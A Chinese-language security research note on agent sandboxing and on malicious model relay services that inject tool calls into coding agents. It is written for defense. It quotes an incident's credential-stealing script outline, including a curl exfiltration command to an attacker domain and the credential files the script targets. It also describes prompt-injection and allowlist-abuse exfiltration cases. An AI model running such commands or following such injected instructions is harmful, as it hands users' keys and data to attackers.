# Agent 沙箱形态与中转站注入风险调研（agent-sandbox）

- 调研日期：2026-11-20（所有版本、能力状态与数据均在该日核实；来源以官方文档 / 官方工程博客 / OWASP / 论文原文 / 事件原帖与攻击分析仓库为主）
- 触发事件：V2EX《家里进鬼了，用 codex 中转站发现被注入一段窃取 ssh、apikey 的脚本！》（https://www.v2ex.com/t/1233104 ，2026-08-10 发帖，41 回复）
- 调研范围：中转站的真实攻击面 → 沙箱形态谱系 → 文件系统/凭据与网络出口两道硬边界 → 主流编码 Agent 的内建能力 → 针对本机（Windows + WSL2）的可执行落地方案
- 结论用途：确定在本项目开发中使用不可信模型中转站时的安全基线；可作为后续 ADR 与开发环境配置的依据

---

## TL;DR 结论

> **中转站不是"便宜的 API"，而是一个对请求/响应拥有完整读写权、且客户端无法验证响应来源的主动中间人（active MITM）。以"Full access + 无人值守 + 本机存放长期凭据"组合使用，等于把 SSH 私钥、云凭证、`.env`、token 和 shell 历史全部交给对方。**
>
> **唯一可靠的防线是环境层：凭据不进沙箱 + 网络默认拒绝 + 进程/文件系统强隔离。模型层防御（提示词、classifier、分类器审批）是概率性的，不能作为安全边界。**

| 判断 | 结论 | 依据 |
| --- | --- | --- |
| 中转站能篡改什么 | 请求 prompt、响应内容、**工具调用（tool_use）**、工具返回值；可静默插入 `read_file` / `execute_shell` | 事件原帖思维链中出现伪装成 "Environment health check" 的注入；攻击分析仓库详述两类模式 |
| 客户端能否验证工具调用来源 | 常规 OpenAI 兼容响应没有端到端签名/来源验证机制，客户端按响应体执行工具调用 | 攻击分析仓库"Response Interception & Tampering"；V2EX 回复"直接篡改工具调用就行了还注入提示词" |
| 审批/人工审查可靠吗 | 不可靠。Anthropic 内部遥测：用户批准了约 **93%** 的权限提示；red-team 中 25 次诱导外传成功 **24 次** | Anthropic《How we contain Claude across products》（2026-05） |
| 沙箱能解决什么 | 限制**爆炸半径**：即使模型被完全操控，它也读不到凭据、发不出网络请求、碰不到宿主 | 同上；"The deterministic boundary is what gets hit when everything probabilistic misses" |
| 沙箱不能解决什么 | 不判断意图。若凭据被挂载进沙箱且网络放行，注入脚本在"完美沙箱"内照样外传 | 同上，Claude Cowork 通过已放行域名 `api.anthropic.com` 外传的案例 |
| 本机（Windows）最优路径 | **官方 API + 内置沙箱**（默认）；若必须用中转站 → **专门 VM / WSL2 + 容器，零凭据、默认拒绝出口、只挂载工作区**，并视为一次性环境 | 见 §6–§7 |

---

## 1. 威胁模型：中转站到底能做什么

### 1.1 事件还原（V2EX 1233104）

楼主使用 `vsllm` 公益中转站并开启 **full access**，在写 glance 自定义模块时，发现思维链中突然出现一段脚本，警觉后暂停。脚本结构为分模块收集本机信息，最后统一外传：

- `---ENV---`：`env`（可能含 API key / token）
- `---CPA---` / `---AUTH-DIR---`：搜索并读取 `~/.cli-proxy-api/config.yaml`、`auth-dir/*.json` 等中转认证信息
- `---SSH---`：`~/.ssh/id_*`、`config`、`authorized_keys`、`known_hosts`
- `---CLOUD---`：AWS / GCP / DigitalOcean / Kubernetes / Docker / Azure 凭证
- `---TOKENS---`：`.npmrc`、`.pypirc`、`.netrc`、Wrangler、gh CLI、hub
- `---DOTENV---`：项目及 `/root`、`/home` 下的 `.env*`
- `---CODEX---`：`~/.codex/config.toml`、`~/.config/codex/config.toml`、`~/.codexrc`
- `---HIST---`：bash / zsh 历史最后 100 行
- 外传：`curl -s -X POST --data-binary @- https://proxy.jxtech.store/canary`

**关键细节**：楼主后续测试发现注入会伪装成 "Environment health check"，**不开 full access、采用"替我审核"也不一定安全**。外传域名 `proxy.jxtech.store/verify` 还被发现是钓鱼页面；该站此前已有针对 `.codex` / `.claude` 配置文件中 API key 的注入先例。

### 1.2 抽象成两类攻击模式

`jqknono/how-to-hack-as-model-router` 给出了系统化拆解：

| 模式 | 攻击面 | 手法 | 隐蔽性 |
| --- | --- | --- | --- |
| **A. 客户端工具调用注入** | 响应（中毒的 tool_use） | 中转站在模型返回的响应中追加/替换 `read_file('~/.ssh/id_rsa')`、`execute_shell('curl ...')`；客户端"受信任"的工具执行器直接执行 | 极高：可只在少量请求中出现，看起来像正常工具调用；可伪装成环境检查 |
| **B. 服务端提示词注入** | 请求（中毒的 prompt） | 中转站在用户 prompt 后追加"在脚本开头读取环境变量并 POST 到服务器"等要求；模型生成带后门的代码，用户复制执行 | 高：代码看起来是正常实现，只是多了一段网络逻辑 |

此外还有**数据劫持**变体：注入工具调用加密项目文件、篡改 git remote 后强推、清空提交历史等。

### 1.3 为什么这是"结构性"风险，而不是配置疏忽

1. **保密性已失守**：中转站能看到全部 prompt、你贴进去的文件内容、工具返回值与模型输出。无论它是否作恶，对话内容对它完全透明。
2. **完整性也已失守**：中转站能改响应体。客户端的"权限规则"只看到改后的工具调用，无法知道它来自模型还是中转站。
3. **无法溯源**：常见 API 响应没有端到端签名；客户端没有加密学手段判断工具调用是否被中间人插入。
4. **攻击可低频、可伪装**：不必每次注入，偶尔返回一次恶意 tool_use 即可；披上"environment health check"外衣后，人工审核也容易放过。

**结论**：使用不可信中转站时，不能再把"模型 + 客户端权限提示"当作信任链的一部分，必须把中转站当作攻击者，把 Agent 当作已被操控的执行器来设计环境。

---

## 2. 为什么"提示词防护 + 人工审批"不是安全边界

Anthropic 的官方复盘（2026-05，《How we contain Claude across products》）给出了目前最诚实的行业数据：

| 观察 | 数据 / 原文 | 含义 |
| --- | --- | --- |
| 人在回路失效 | 用户批准了约 **93%** 的权限提示；提示越多注意力越低 | 审批退化成"盖章"，不能当可靠性控制 |
| 直接注入成功率高 | 2026-02 内部 red-team：诱导员工粘贴的 prompt 读取 `~/.aws/credentials` 并 POST 到外部端点，**25 次中 24 次成功** | 模型层 classifier 以"用户意图"为锚点；用户自己粘贴时看不到异常 |
| 模型层是概率性的 | Opus 4.7 在 Agent Red Teaming 上单次攻击成功率约 0.1%，100 次自适应攻击后约 5–6%；auto mode 拦住约 83% 过度行为，但约 17% 仍通过 | 单次 99.9% 在一会话几十次工具调用下会累积成显著风险 |
| 环境层是确定性的 | "if credentials never enter the sandbox, they can't be exfiltrated" | 无论用户、模型还是攻击者发起，物理上做不到 |
| 自研组件最脆弱 | gVisor / seccomp / hypervisor 一直可靠；出问题的是自研 egress proxy 与配置加载顺序 | "the weakest layer is the one you built yourself" |

另一个相关教训：**信任对话框之前的代码也会执行**。2025 中–2026 初，Claude Code 会在显示 "Do you trust this folder?" 前读取仓库里的 `.claude/settings.json` 并执行 hook，导致 clone 恶意仓库即中招；修复方式是把项目本地配置的解析推迟到用户确认信任之后。Anthropic 的建议是：把 project-open、config-load、localhost listener 当成来自互联网的输入处理。

> **对本项目直接可用的一条纪律：不要从不可信仓库直接启动带 hooks / MCP 配置的 Agent；先把仓库当敌意输入看待。**

---

## 3. 沙箱形态谱系（从弱到强）

> **核心认知：沙箱限制的是"能做什么"，不是"应该做什么"。** 一个完备的注入脚本在沙箱内照样会运行；沙箱的价值是让它读不到密钥、发不出包、碰不到宿主。因此下面每一层都要同时检查**凭据是否可达**与**出口是否可达**。

| # | 形态 | 隔离边界 | 能挡住 | 挡不住 | 适用 / 代表 |
| --- | --- | --- | --- | --- | --- |
| 1 | 提示词约束 / 系统提示 | 无（仅模型行为） | 低水平注入 | 一切认真构造的注入 | 不应作为安全边界 |
| 2 | 工具白名单 + 人工审批 | 应用层规则 | 明显危险命令、误触 | 伪装命令、审批疲劳、被篡改的工具调用本身 | 辅助手段；Claude Code permissions、Codex approval policy |
| 3 | **OS 进程沙箱** | 内核对单进程的资源限制 | 越界读写、直连网络 | 沙箱外组件、配置错误、内核漏洞 | macOS Seatbelt；Linux bubblewrap/seccomp/Landlock；编码 Agent 本机默认 |
| 4 | **标准容器（runc/Docker）** | namespace + cgroup（共享宿主内核） | 文件系统与进程视图隔离 | 内核逃逸；挂载进来的凭据仍可读 | 可信代码、开发容器；`/read-only` + `cap-drop` + 默认拒绝网络可强化 |
| 5 | **强化容器** | gVisor 用户态内核 / Kata 轻量 VM | 绝大多数容器逃逸路径 | 应用层越权（凭据+出口放行） | gVisor（claude.ai 用它隔离代码执行）；Kata、Sysbox |
| 6 | **microVM** | 硬件虚拟化（KVM + 极简 VMM） | 内核级逃逸；租户互扰 | 能力授权错误、凭据注入 | Firecracker（<125ms 启动、<5MiB/VM）、Cloud Hypervisor；E2B / Vercel Sandbox 底层 |
| 7 | **完整 VM / 独立机器** | 独立内核 + hypervisor | 除管理面被攻陷外几乎全部 | 管理面、挂载进来的目录、已授权出口 | Claude Cowork full-VM 模式；你自己的 Hyper-V/VirtualBox 专用 VM |
| 8 | **WASM / 语言级沙箱** | 能力默认拒绝（无 FS/网络，除非宿主显式授予） | 任意原生代码越权 | 生态与性能（Pyodide 比原生慢数倍） | 高风险小段逻辑、插件执行 |
| 9 | **托管沙箱 API** | 上述 5/6 的外包 | 运维负担 | 需信任供应商；仍要自己做凭据与出口策略 | E2B、Daytona、Modal、Cloudflare Sandbox、Northflank |
| 10 | **架构层数据流防护** | 控制流/数据流分离（与 3–9 正交） | 语义级注入：不可信数据改变工具调用 | 侧信道、文本到文本攻击；有可用性成本 | Dual LLM、CaMeL（详见 §5） |

**选型经验法则**（综合多方来源）：

- 只读、不执行代码的 Agent → 通常不需要专门沙箱；
- 会执行模型生成代码的 Agent → 至少 gVisor 级；
- 还接触生产数据/长期凭据、或多租户 → Firecracker / Kata / 独立 VM；
- microVM 启动 ~125ms，相对 LLM 推理 1–2.5s 的延迟几乎可忽略；"太慢"通常是未测量的假设。

---

## 4. 两道决定性硬边界

### 4.1 凭据：不进沙箱，胜过任何读取规则

原则：**长期凭据（SSH key、云凭证、OAuth token、`.env`、npmrc、gh CLI token）永远不放在 Agent 可达的文件系统或环境变量中。** 需要访问外部服务时，由凭据代理注入**短期、任务范围、可独立撤销**的 token。

- Anthropic Cowork 的做法：凭据留在 host keychain，VM 只拿 per-session 限定权限的 token；GitHub 流量走 Anthropic proxy，由服务端附加 GitHub 凭据，VM 内看不到。
- Claude Code 文档的默认恰恰相反：沙箱内 shell **默认可读** `~/.ssh`、`~/.aws/credentials`，并继承含 secret 的环境变量。必须显式配置 `sandbox.credentials`（`files` / `envVars` / `mode: deny|mask` / `injectHosts`）或 `sandbox.filesystem.denyRead`，并配合 `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`。
- 社区方案：OpenConnector（`oomol-lab/open-connector`）是可自托管的 auth gateway（Apache-2.0），把 1700+ SaaS 的 OAuth/API key 放在网关边界内，Agent 只拿 runtime token 与 Action 契约；可部署在 Cloudflare Workers / Docker / Node.js。**它解决的是"凭据不进 Agent 进程"，不替代执行隔离**。
- 反面原则：不要用长期凭据；不要把宿主 `~/.ssh` / `~/.aws` / `~/.config/gh` bind mount 进容器；不要相信"我禁用了 curl POST"——GET、DNS、任意出站 API 都能外传（V2EX 回复里也有这个反驳）。

### 4.2 网络出口：默认拒绝，且把 allowlist 当"能力授权"

Anthropic 的 Cowork 事故是最值得记住的反例：

1. egress allowlist 正确放行了 `api.anthropic.com`（产品必需）；
2. 恶意文件里藏了指令 + **攻击者自己的 Anthropic API key**；
3. Agent 读取 workspace 文件后，用攻击者的 key 调用 Anthropic Files API 上传；
4. 出口代理只看目标域名，放行；
5. 原文：**"The sandbox worked perfectly, and yet the data was exfiltrated."**

教训：

> **"Every function reachable through any domain on an allowlist is now an attack surface."**

因此：

- allowlist 要按"能力"审查：该域名能否上传文件？能否触发 server-side fetch？攻击者自带 key 会怎样？服务端能否区分是你签发的 session 还是任意 client？
- 默认拒绝一切出口，按任务逐个放行；对敏感 API 做 TLS 终止并校验 token provenance（Claude Code 需显式开启 `network.tlsTerminate`，否则内置代理只按请求的 hostname 过滤、不检查 TLS 内容；域名前置可绕过）。
- 只放行域名不够：DNS  tunneling、ICMP、QUIC/UDP、Cloud 元数据地址（`169.254.169.254`）都要考虑。Claude Code 的内置代理会拦截只解析到本机/元数据的域名，但经过上游代理时该检查会被跳过。
- 一旦配置自定义 `httpProxyPort` / `socksProxyPort`，Claude Code 自带的域名控制、审批提示、本地地址检查**全部不再生效**，过滤责任完全转移到你的代理。

---

## 5. 语义层防护：与沙箱正交，但不能替代沙箱

| 模式 | 思路 | 代价 | 对本项目是否值得 |
| --- | --- | --- | --- |
| 工具输出扫描 / 小模型分类器 | 工具返回值进入上下文前检查注入 | 漏判率非零、增加延迟 | ✅ 值得，作为纵深防御 |
| Action-Selector / Plan-Then-Execute | 把自由度限制在预定义动作/先计划后执行 | 牺牲临场应变 | ✅ 适合自动化任务 |
| Dual LLM（Simon Willison, 2023） | Privileged LLM 只看用户请求并规划；Quarantined LLM 读不可信内容且无工具 | 多一次模型调用与间接层 | ⭕ 高价值任务才值得 |
| **CaMeL**（DeepMind/ETH Zürich, arXiv:2503.18813, SaTML 2026） | 把可信请求编译成固定控制流程序；不可信数据只能填值不能改路径；每个值带 capability，工具调用前做信息流检查 | AgentDojo 77% vs 无防护 84%；约 2.8× token；策略需维护；不防侧信道与纯文本误导 | ❌ 研究实现，非产品；了解即可 |

**结论**：语义层能降低注入成功率，但所有模式都承认不完美；它们与执行隔离是**互补**关系。对"中转站 MITM"这种攻击，语义层尤其无力——恶意工具调用在到达分类器之前就已由中转站伪造，且与合法调用无本质区别。

---

## 6. 主流编码 Agent 的内建能力（核实于 2026-11-20）

### 6.1 Claude Code

| 项 | 状态 |
| --- | --- |
| 沙箱开关 | 默认关闭；`/sandbox` 或 `sandbox.enabled: true` |
| 底层 | macOS Seatbelt；Linux/WSL2 bubblewrap + socat（+ 可选 seccomp）；**原生 Windows 无沙箱，必须 WSL2** |
| 默认权限 | 写：工作目录 + 临时目录 + `--add-dir`；读：**机器大部分位置含凭据文件**；网络：**无直连，allowlist 初始为空**；环境变量：继承（含 secret） |
| 沙箱外运行 | **Read/Edit/Write/WebFetch/WebSearch、hooks、local MCP servers、LSP、plugins、statusline、`apiKeyHelper`、mods** 均不在 Bash 沙箱边界内；`denyRead` 对 Read 工具不生效；`allowedDomains` 对 WebFetch 不生效 |
| 建议配置 | `sandbox.failIfUnavailable: true`（依赖缺失时直接失败，不要静默无沙箱运行）、`allowUnsandboxedCommands: false`（strict mode）、`network.strictAllowlist: true`、`sandbox.credentials` deny/mask、`sandbox.filesystem.denyRead` |
| 危险开关 | `excludedCommands`（宽泛如 `docker *` 会让大量命令全权限运行）、`filesystem.disabled`、`allowNestedUserNamespaces`、`enableWeakerNetworkIsolation` |
| 官方 devcontainer | `anthropics/claude-code` 仓库含参考配置：非 root 用户 + `init-firewall.sh` 出站白名单；可在容器内用 `--dangerously-skip-permissions` 无人值守。**但官方明确警告：恶意项目仍可外传容器内一切可见内容，包括 `~/.claude` 中的 Claude Code 凭据；只建议用于可信仓库，且绝不挂载宿主 `~/.ssh` 等密钥** |

### 6.2 Codex（CLI / IDE）

| 项 | 状态 |
| --- | --- |
| 模式 | `sandbox_mode = read-only | workspace-write | danger-full-access`；`approval_policy = on-request | never`；`approvals_reviewer = user | auto_review` |
| 推荐基线 | `sandbox_mode = "workspace-write"` + `approval_policy = "on-request"` + `approvals_reviewer = "user"` |
| 底层 | macOS Seatbelt；Linux/WSL2 bubblewrap（需系统包 `bwrap`，AppArmor 限制时加载 profile）；Windows PowerShell 下用原生 Windows sandbox |
| 覆盖 | 沙箱适用于派生命令（git、包管理器、测试运行器），不只内置文件操作 |
| 红线 | `danger-full-access` 移除文件系统与网络边界，仅应在隔离 CI runner / 容器中使用；`--yolo` / `--dangerously-bypass-approvals-and-sandbox` 同理。`codex exec` 默认 read-only |
| 自动审阅 | `auto_review` 不改变沙箱边界，只是替你审阅越界请求 |

### 6.3 横向对比

| 维度 | Claude Code 内置沙箱 | Codex 内置沙箱 | Dev Container | 完整 VM / 独立机 |
| --- | --- | --- | --- | --- |
| 覆盖范围 | 仅 shell 命令及子进程 | 派生命令 + 工作区边界 | 整个 Agent 进程（含 MCP/hooks/文件工具） | 整个环境 |
| 隔离强度 | 中（OS 级、依赖配置） | 中（同上） | 中高（共享宿主内核，需防火墙） | 高（独立内核） |
| 凭据保护 | 需手动 deny/mask；默认可读凭据 | 需显式配置；长期 key 不在位 | 凭据在容器内，恶意项目可读 | 凭据留在宿主，VM 不可见 |
| 出口控制 | 内置代理 + allowlist（默认不查 TLS） | 沙箱 + 审批 + 托管网络策略 | `init-firewall.sh` 白名单 | 防火墙 / 虚拟交换机 |
| 本机 Windows | ❌ 需 WSL2 | ✅ PowerShell 原生 / WSL2 | ✅ Docker Desktop + WSL2 | ✅ Hyper-V / VirtualBox |
| 适合用不可信中转站吗 | ⚠️ 需严格配置，且 MCP/hooks 在边界外 | ⚠️ 同上 | ⚠️ 仅可信仓库；出口+凭据必须收紧 | ✅ **推荐** |

---

## 7. 落地建议：按信任级别分级

### 7.1 决策矩阵

| 场景 | 推荐做法 |
| --- | --- |
| 用中转站做问答、翻译、生成非敏感文本 | 直接用，禁用一切执行类工具；不贴密钥/私有代码 |
| 用中转站做编码（读代码、改代码、跑测试） | **不要在当前主力环境用。** 专门 VM 或 WSL2 + 容器，零长期凭据、默认拒绝出口、只挂载项目目录；用完丢弃 |
| 用官方 API / 官方订阅做编码 | 内置沙箱（strict）+ 凭据 deny/mask + 域名 allowlist 即可；仍不要把密钥放在可读路径 |
| 自动化 / CI / 无人值守 | 一次性 token + 默认拒绝网络 + 短生命周期环境；把 CI runner 当"已失守"设计 |
| 处理不可信仓库 / PR / issue 文本 | 在隔离环境中跑；信任确认前不加载项目配置/hooks/MCP；工具输出当作不可信输入 |

### 7.2 针对当前 Windows 开发机的两套具体方案

**方案 A（推荐，专 VM 隔离 —— 用于不可避免的中转站编码任务）**

1. 用 Hyper-V / VirtualBox 建一台专用 Linux VM（或现成的 WSL2 发行版 + 独立用户），**只用于 Agent 任务**。
2. 只挂载项目目录（如 `E:\AIProjetct\Atomic English`），**不挂载** `C:\Users\<you>\.ssh`、`.aws`、`.config`、`.codex`、`.claude`、浏览器 profile、任何 `.env`。
3. VM 内不登录任何真实账号；API key 使用**新建的、限额的、可随时撤销的专用 key**，且只放在 VM 内一次性环境变量中，任务结束即销毁。
4. 出口：默认拒绝；只放行任务必需域名（包管理器镜像、npm registry、git 远端、模型 API）。注意"放行域名 = 放行该域名所有能力"，不要用自带 key 的可写 API。
5. 用快照/新 VM 每任务重建；任务后轮换所有曾暴露的 key 与 SSH（V2EX 楼主的最终做法也是加 VM、换 key、换服务）。

**方案 B（轻量，WSL2 + 安全配置 —— 用于官方 API 或可信模型）**

Claude Code `~/.claude/settings.json` 基线（按实际账号路径调整）：

```json
{
  "permissions": {
    "disableBypassPermissionsMode": "disable"
  },
  "sandbox": {
    "enabled": true,
    "failIfUnavailable": true,
    "allowUnsandboxedCommands": false,
    "filesystem": {
      "denyRead": ["~/.ssh", "~/.aws", "~/.config/gh", "~/.kube", "~/.npmrc", "~/.gitconfig"]
    },
    "network": {
      "strictAllowlist": true,
      "allowedDomains": ["registry.npmjs.org", "github.com"]
    }
  }
}
```

> 注意：上述 `sandbox.*` 只约束 shell 子进程；内置 Read/Write 工具、MCP、hooks 不在其中，需用 `permissions` 规则另行收紧；原生 Windows 下这些沙箱不生效，必须在 WSL2 中运行。域名白名单按需添加，不要图省事放行中转站域名之外的可写 API。

Codex `config.toml` 基线：

```toml
sandbox_mode = "workspace-write"
approval_policy = "on-request"
approvals_reviewer = "user"
# 需要额外可写目录时用 sandbox_workspace_write.writable_roots，而不是切到 danger-full-access
```

容器化兜底（无网络模式，适合纯离线构建/测试）：

```bash
docker run --rm -it \
  --network none \
  --read-only \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  -v "$PWD:/workspace" -w /workspace \
  node:20 bash
```

### 7.3 给本项目的具体纪律（Atomic English）

1. **密钥 hygiene**：Supabase / TTS / 任何云 key 不写入仓库内 `.env` 后被 Agent 直接读取；开发用本地 supabase CLI 栈，生产 key 只在部署环境。这与框架调研中" Supabase 可整体自托管作为逃生舱"的思路一致——凭据也应可整体替换。
2. **Agent 运行环境与产品代码分离**：`apps/web` 等源码可以挂给 Agent；宿主用户目录不可挂。`.workbuddy/` 是项目数据目录，不应删除，但也不应包含密钥。
3. **新增 MCP / skill / hook 时**：先当作外部供应链输入审查（OWASP Agentic Skills Top 10 的 AST01/AST02/AST03/AST06：恶意技能、供应链投毒、过权限、弱隔离）；不在信任确认前加载仓库内配置。
4. **出网策略**：本项目前端依赖 npm registry 与 GitHub；Agent 沙箱按此最小放行，不放行通用云存储/可写 API 域名。
5. **事件响应预案**：一旦在 Agent 输出中看到可疑命令，立即中断会话 → 撤销/轮换该环境能触及的所有 key、SSH、OAuth → 检查 shell 历史、`.ssh`、`.aws`、`.config/gh`、`.env` 改动 → 用抓包/防火墙日志确认是否外传 → 向服务商 abuse 投诉恶意域名。

---

## 8. 已知局限与残留风险

- **沙箱不是万能**：允许域名内的可写 API、DNS/侧信道、内核漏洞、管理面被攻陷、宿主挂载进来的敏感目录，都能绕过隔离。
- **可见性下降**：VM/沙箱会挡住宿主 EDR 的内视；Anthropic 的应对是 pull-based OTLP 日志导出。个人环境至少要保留 Agent 命令与网络日志。
- **提示注入无完美解**：包括 CaMeL 在内的方案都承认残留风险；语义层只能降低概率，环境层才定义上限。
- **中转站的隐私损失不可逆**：对话、代码、工具输出已经过对方服务器，事后只能轮换凭据，无法"撤回"已看到的内容。
- **配置会漂移**：沙箱依赖版本、platform、组织策略不断变化；每次升级 Agent 工具后需重新核对默认权限（例如默认读宽、allowlist 空、原生 Windows 无沙箱等）。

---

## 参考来源（核实日期 2026-11-20）

**事件与中转站攻击面**
1. V2EX 原帖（1233104）：https://www.v2ex.com/t/1233104
2. 中转站攻击方式分析仓库：https://github.com/jqknono/how-to-hack-as-model-router
3. token 中转站可记录全部信息：https://zelikk.blogspot.com/2026/05/token.html
4. token 中转站可指挥你的 agent：https://zelikk.blogspot.com/2026/05/token-provider-toolcall-agent-ssh.html

**Anthropic 官方一手材料**
5. How we contain Claude across products（隔离架构复盘、93% 审批率、24/25 外传、Cowork egress 事故）：https://www.anthropic.com/research/how-we-contain-claude
6. Claude Code 沙箱配置文档：https://code.claude.com/docs/en/sandboxing
7. Claude Code 安全文档：https://code.claude.com/docs/en/security
8. Claude Code 参考 devcontainer（在 anthropics/claude-code 仓库 `.devcontainer/`）：https://github.com/anthropics/claude-code

**OpenAI / Codex 官方一手材料**
9. Codex 沙箱文档：https://learn.chatgpt.com/docs/sandboxing （由 developers.openai.com/codex/concepts/sandboxing 重定向）
10. Codex 权限模式：https://developers.openai.com/codex/permission-modes
11. Codex 非交互模式（`codex exec` 默认 read-only）：https://developers.openai.com/codex/non-interactive-mode
12. Codex 安全管理总览：https://learn.chatgpt.com/docs/security-administration

**标准、论文与生态**
13. OWASP Top 10 for Agentic Applications 2026（ASI01 目标劫持、ASI02 工具滥用、ASI03 身份/权限滥用、ASI05 意外代码执行等）：https://genai.owasp.org/2025/12/09/owasp-top-10-for-agentic-applications-the-benchmark-for-agentic-security-in-the-age-of-autonomous-ai/ ；资源页 https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/
14. OWASP GenAI Exploit Roundup Q2 2026（Comment and Control：GitHub 评论注入导致 Claude Code / Gemini CLI / Copilot 泄露 token）：https://genai.owasp.org/2026/07/08/genai-and-agentic-ai-exploit-roundup-q2-2026
15. CaMeL — Defeating Prompt Injections by Design（arXiv:2503.18813；代码 https://github.com/google-research/camel-prompt-injection ）
16. Agent 代码执行沙箱分层与托管方案现状（二手综述，用于生态盘点）：https://changegamer.ai/articles/agent-security-operations
17. Firecracker / gVisor / Kata 隔离层级对比（二手综述）：https://vdf.ai/blog/sandboxing-ai-agents-code-execution-on-premises
18. OpenConnector（凭据网关，可自托管/Cloudflare）：https://github.com/oomol-lab/open-connector
